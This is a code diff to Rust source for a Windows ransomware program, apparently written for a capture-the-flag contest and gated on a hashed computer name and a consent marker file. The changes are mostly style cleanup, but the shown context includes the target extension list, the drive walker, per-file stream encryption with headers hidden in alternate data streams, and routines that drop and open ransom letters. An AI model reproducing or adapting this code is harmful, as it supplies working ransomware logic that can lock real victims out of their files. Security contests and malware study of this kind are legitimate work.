@@ -11,7 +11,7 @@ use std::fs;
 use std::fs::File;
 use std::io::Write;
 use std::path::{Path, PathBuf};
-use std::sync::mpsc;
+use std::sync::{mpsc, Arc};
 use std::thread;
 use std::time::Duration;
 use sys_locale::get_locale;
@@ -25,12 +25,12 @@ use windows::Win32::UI::Shell::ShellExecuteW;
 use windows::{Win32::System::WindowsProgramming::*, Win32::UI::WindowsAndMessaging::*};
 
 // blake3::hash(b"the-victim-host"); Computer name is limited to 15 characters.
-const EXPECTED_COMPUTER_NAME_HASH_HEX: &'static str =
+const EXPECTED_COMPUTER_NAME_HASH_HEX: &str =
     "b241392db7a4bdf3b2efc952c4b7d44dfe23c7e193fe95b2db2824e35f133a42";
-const CONSENT_MARKER_FILE_NAME: &'static str =
+const CONSENT_MARKER_FILE_NAME: &str =
     "YesIKnowIAmRunningARealRansomwareTheDecryptionKeyWillOnlyBeReleasedAfterTheCTFEndsPleaseGoOn.txt";
-const RANSOM_LETTER_FILE_NAME: &'static str = "README_ALL_YOUR_FILES_ARE_BELONG_TO_US.txt";
-const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &[
+const RANSOM_LETTER_FILE_NAME: &str = "README_ALL_YOUR_FILES_ARE_BELONG_TO_US.txt";
+const EXTENSION_TO_ENCRYPT: &[&str] = &[
     "txt", "doc", "docx", "jpg", "png", "bmp", "7z", "zip", "rar", "sav", "py", "js", "ppt",
     "pptx", "xls", "xlsx",
 ];
@@ -131,7 +131,7 @@ fn is_victim_file(entry: &walkdir::DirEntry) -> bool {
             && entry.file_name() != CONSENT_MARKER_FILE_NAME
             && EXTENSION_TO_ENCRYPT.iter().any(|v| v == &ext);
     }
-    return false;
+    false
 }
 
 fn encrypt_file(path: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
@@ -145,8 +145,8 @@ fn encrypt_file(path: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
     fs::rename(&path, &new_path)?;
     let mut fin = File::open(&new_path)?;
     let mut fout = File::options().read(true).write(true).open(&new_path)?;
-    let mut fads = File::create(&ads_path)?;
-    let header = cipher::encrypt_stream(&key, &mut fin, &mut fout)?;
+    let mut fads = File::create(ads_path)?;
+    let header = cipher::encrypt_stream(key, &mut fin, &mut fout)?;
     fads.write_all(&header.to_vec())?;
     fads.sync_all().ok();
     fout.sync_all()?;
@@ -173,7 +173,7 @@ Your victim identifier is: {}
     Ok(())
 }
 
-fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
+fn the_boring_loop(key: &Arc<PerVictimKey>) -> Result<()> {
     let drives = get_all_suitable_drives();
     let (letter_tx, letter_rx) = mpsc::channel::<PathBuf>();
     let (tx, rx) = crossbeam_channel::bounded(QUEUE_SIZE);
@@ -198,7 +198,7 @@ fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
                 log::trace!("Dropping ransom letter for {:?}", f);
                 if let Some(dir) = f.parent() {
                     if !dir.join(RANSOM_LETTER_FILE_NAME).exists() {
-                        skip_error_and_debug!(drop_ransom_letter(&dir, &key));
+                        skip_error_and_debug!(drop_ransom_letter(dir, &key));
                     }
                 }
             }
@@ -211,7 +211,7 @@ fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
         for entry in walker
             .skip_error()
             .inspect(|e| log::trace!("Walking entry: {:?}", e))
-            .filter(|e| !e.path_is_symlink() && is_victim_file(&e))
+            .filter(|e| !e.path_is_symlink() && is_victim_file(e))
         {
             log::debug!("Target file: {:?}", entry);
             skip_error_and_debug!(tx.send(entry.into_path()));
@@ -230,7 +230,7 @@ fn try_show_ransom_letter_on_desktop(victim_key: &PerVictimKey) -> Result<()> {
         .expect("UserDirs must work if we got here")
         .desktop_dir()
     {
-        drop_ransom_letter(desktop_dir, &victim_key)?;
+        drop_ransom_letter(desktop_dir, victim_key)?;
         let filename = U16CString::from_os_str(desktop_dir.join(RANSOM_LETTER_FILE_NAME))?;
         let lpfile = windows::core::PCWSTR::from_raw(filename.as_ptr());
         unsafe {
@@ -272,7 +272,7 @@ fn main() -> Result<()> {
         return Ok(());
     }
     log::debug!("Single instance acquired");
-    let victim_key = key_mgmt::ensure_key()?;
+    let victim_key = Arc::new(key_mgmt::ensure_key()?);
     log::debug!("Victim key acquired {:?}", &victim_key);
     wait_for_user_idle();
     the_boring_loop(&victim_key)?;
